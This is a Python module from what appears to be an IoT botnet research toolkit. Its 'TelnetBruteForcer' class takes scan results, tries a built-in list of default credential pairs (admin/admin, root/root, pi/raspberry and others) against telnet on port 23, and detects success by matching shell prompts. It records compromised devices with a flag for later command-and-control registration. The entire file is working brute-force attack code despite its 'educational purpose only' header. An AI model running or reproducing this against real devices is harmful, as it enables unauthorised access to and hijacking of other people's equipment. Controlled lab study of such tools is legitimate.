#!/usr/bin/env python3
"""
IoT Security Research - Telnet Brute Force Module
Educational Purpose Only - For Controlled Lab Environment
"""

import socket
import telnetlib
import logging
import re
from datetime import datetime
from credentials import get_credentials


class TelnetBruteForcer:
    """Handles telnet brute force attacks"""
    
    def __init__(self, logger=None):
        self.logger = logger or logging.getLogger(__name__)
        self.compromised_devices = []
        self.load_credentials()
    
    def load_credentials(self):
        """Load credentials from external file"""
        try:
            self.credentials = get_credentials()
            self.log(f"Loaded {len(self.credentials)} credential pairs from credentials.py")
        except ImportError:
            self.log("Warning: Could not import credentials.py, using fallback credentials")
            # Minimal fallback credentials if file is not available
            self.credentials = [
                ("ipcamadmin", "admin"),      # Digital IPCam credentials
                ("temphumidadmin", "admin"),  # Digital TempHumidSensor credentials
                ("admin", "admin"),
                ("root", "root"), 
                ("admin", "password"),
                ("admin", "123456"),
                ("root", "admin"),
                ("pi", "raspberry"),
                ("ubuntu", "ubuntu")
            ]
    
    def log(self, message):
        """Log message with timestamp"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.logger.info(f"[BruteForcer] {message}")
        print(f"[{timestamp}] {message}")
    
    def attempt_telnet_login(self, host, port, username, password):
        """Attempt to login via telnet with given credentials"""
        try:
            tn = telnetlib.Telnet(host, port, timeout=10)
            
            try:
                # Read initial prompt/banner
                initial_response = tn.read_until(b"login:", timeout=10)
                if not initial_response:
                    # Try alternative prompts
                    tn.write(b"\n")
                    initial_response = tn.read_very_eager()
                
                # Send username
                tn.write(username.encode() + b"\n")
                
                # Wait for password prompt
                password_prompt = tn.read_until(b"password:", timeout=10)
                if not password_prompt:
                    # Try alternative password prompts
                    password_prompt = tn.read_until(b"Password:", timeout=5)
                
                # Send password
                tn.write(password.encode() + b"\n")
                
                # Read response to check for successful login
                response = tn.read_until(b"#", timeout=15)
                if not response:
                    response = tn.read_until(b"$", timeout=10)
                if not response:
                    response = tn.read_very_eager()
                
                # Define success patterns (shell prompts)
                success_patterns = [
                    b"#", b"$",  # Basic shell prompts
                    b"$ ", b"# ",  # Basic shell prompts (but only with space after)
                    b"admin@", b"root@", b"user@", b"ipcamadmin@", b"temphumidadmin@",  # Specific user prompts
                    b"menu>", b"Main Menu", b"BusyBox",  # Device-specific prompts
                    b"~$ ", b"~# ", b"~]$ ", b"~]# "  # Additional common shell patterns
                ]
                
                failure_patterns = [
                    b"incorrect", b"failed", b"invalid", b"denied", 
                    b"Login incorrect", b"Access denied", b"Authentication failed",
                    b"wrong", b"error", b"failure", b"not recognized",
                    b"login failed", b"access denied", b"authentication failed",
                    b"permission denied", b"login attempt failed"
                ]
                
                # Check for success patterns
                response_lower = response.lower()
                
                # First check for failure patterns (more specific)
                for pattern in failure_patterns:
                    if pattern in response_lower:
                        self.log(f"[FAIL] Login failed for {host} with '{username}':'{password}' - Authentication rejected")
                        tn.close()
                        return False
                
                # Then check for success patterns
                for pattern in success_patterns:
                    if pattern in response:
                        self.log(f"[SUCCESS] Login successful for {host} with '{username}':'{password}'")
                        tn.close()
                        return True
                
                # If no clear success/failure pattern, assume failure
                self.log(f"[FAIL] Login failed for {host} with '{username}':'{password}' - No clear shell prompt")
                tn.close()
                return False
                
            except Exception as e:
                self.log(f"[FAIL] Telnet interaction failed for {host}: {e}")
                tn.close()
                return False
                
        except Exception as e:
            self.log(f"[FAIL] Telnet connection failed for {host}: {e}")
            return False

    def brute_force_telnet(self, scan_results):
        """Brute force telnet credentials for discovered devices"""
        if not scan_results:
            self.log("No scan results available. Please run a scan first.")
            return []
            
        self.log("Brute-forcing Telnet credentials...")
        success_count = 0
        
        # Filter for telnet services
        telnet_targets = [target for target in scan_results 
                         if target['service'].lower() == 'telnet' and target['port'] == 23]
        
        if not telnet_targets:
            self.log("No telnet services found in scan results.")
            return []
            
        self.log(f"Found {len(telnet_targets)} telnet targets to brute force")
        
        for target in telnet_targets:
            target_ip = target['ip']
            self.log(f"Starting brute-force attack on {target_ip}")
            
            success = False
            successful_creds = None
            
            # Try each credential pair
            for i, (username, password) in enumerate(self.credentials):
                self.log(f"Trying credential {i+1}/{len(self.credentials)}: '{username}':'{password}' on {target_ip}")
                
                if self.attempt_telnet_login(target_ip, 23, username, password):
                    self.log(f"[SUCCESS] SUCCESS! {target_ip} compromised with '{username}':'{password}'")
                    successful_creds = (username, password)
                    success = True
                    break
                else:
                    self.log(f"[FAIL] Failed: '{username}':'{password}' on {target_ip}")
            
            # Store the compromised device if credentials were found
            if success and successful_creds:
                username, password = successful_creds
                device_info = {
                    'ip': target_ip,
                    'username': username,
                    'password': password,
                    'status': 'online',
                    'registered_c2': False,  # Will be updated when registered with C2
                    'device_type': 'unknown',
                    'timestamp': datetime.now().isoformat()
                }
                self.compromised_devices.append(device_info)
                success_count += 1
            else:
                self.log(f"[FAIL] Complete brute-force failure for {target_ip} - tried all {len(self.credentials)} credential pairs")
        
        self.log(f"Brute-force completed! Successfully compromised {success_count}/{len(telnet_targets)} devices")
        return self.compromised_devices
    
    def get_compromised_devices(self):
        """Return list of compromised devices"""
        return self.compromised_devices
    
    def clear_devices(self):
        """Clear compromised devices list"""
        self.compromised_devices = []
